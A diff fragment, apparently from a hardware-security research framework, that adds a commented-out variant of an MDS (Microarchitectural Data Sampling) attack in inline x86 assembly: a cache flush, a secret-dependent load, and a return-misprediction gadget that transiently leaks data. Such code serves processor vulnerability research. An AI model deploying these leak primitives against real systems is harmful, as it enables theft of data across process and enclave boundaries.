@@ -73,6 +73,39 @@ static void mds_attack(enclyser_attack_t *attack_spec, enclyser_buffer_t *attaki
     {
     case ATTACK_MINOR_NONE:
         break;
+    // case ATTACK_MINOR_NO_TSX:
+    //     asm volatile(
+    //         "movq %4, %%r8\n"
+    //         "tzcnt %%rcx, %%rcx\n"  /** rcx = log2(CACHELINE_SIZE) */
+    //         "mfence\n"
+    //         "call 2f\n"
+    //         "clflush (%%r8)\n"
+    //         "movzbq (%%rdi, %%rsi), %%rax\n"
+    //         "shl %%cl, %%rax\n"
+    //         "movzbq (%%rax, %%rdx), %%rax\n"
+    //         "3: pause\n"
+    //         "jmp 3b\n"
+    //         "2:\n"
+    //         "movabs $1f, %%rax\n"
+    //         "imulq $1, %%rax, %%rax\n"
+    //         "imulq $1, %%rax, %%rax\n"
+    //         "imulq $1, %%rax, %%rax\n"
+    //         "imulq $1, %%rax, %%rax\n"
+    //         "imulq $1, %%rax, %%rax\n"
+    //         "imulq $1, %%rax, %%rax\n"
+    //         "imulq $1, %%rax, %%rax\n"
+    //         "imulq $1, %%rax, %%rax\n"
+    //         "imulq $1, %%rax, %%rax\n"
+    //         "imulq $1, %%rax, %%rax\n"
+    //         "imulq $1, %%rax, %%rax\n"
+    //         "imulq $1, %%rax, %%rax\n"
+    //         "mov %%eax, (%%rsp)\n"
+    //         "retq\n"
+    //         "1:\n"
+    //         :
+    //         : "D"(rdi), "S"(rsi), "d"(rdx), "c"(rcx), "r"(r8)
+    //         :);
+    //         break;
     case ATTACK_MINOR_STABLE:
         asm volatile(
             "movq %4, %%r8\n"
